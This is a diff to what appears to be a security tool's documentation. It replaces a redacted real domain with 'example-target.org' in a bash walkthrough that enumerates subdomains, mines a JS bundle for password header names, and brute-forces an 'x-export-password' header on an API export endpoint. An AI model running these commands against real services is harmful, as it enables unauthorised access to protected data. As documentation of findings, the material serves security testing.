@@ -22,15 +22,15 @@ chain detect pairs same-origin findings (the `_origin()` key: scheme + netloc). 
 
 ```bash
 # 1. Discover hosts (DNS + TLS SAN)
-echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.f***REDACTED***.org; done
-openssl s_client -connect f***REDACTED***.org:443 -servername f***REDACTED***.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
+echo -e "api\ndoc\ninternal\nstatus\nstaging" | while read s; do host $s.example-target.org; done
+openssl s_client -connect example-target.org:443 -servername example-target.org < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
 
 # 2. Mine JS bundle for password headers
-curl -s https://doc.f***REDACTED***.org | grep -oP 'x-[a-z]+-password'
+curl -s https://doc.example-target.org | grep -oP 'x-[a-z]+-password'
 
 # 3. Brute-force (no rate limit → full speed)
-for p in admin password f***REDACTED*** openinfra madsys harvard seal; do
-  curl -s -H "x-export-password: $p" "https://openinfra.f***REDACTED***.org/api/export?days=30" | head -c 100
+for p in admin password example-target openinfra madsys harvard seal; do
+  curl -s -H "x-export-password: $p" "https://openinfra.example-target.org/api/export?days=30" | head -c 100
 done
 ```
 
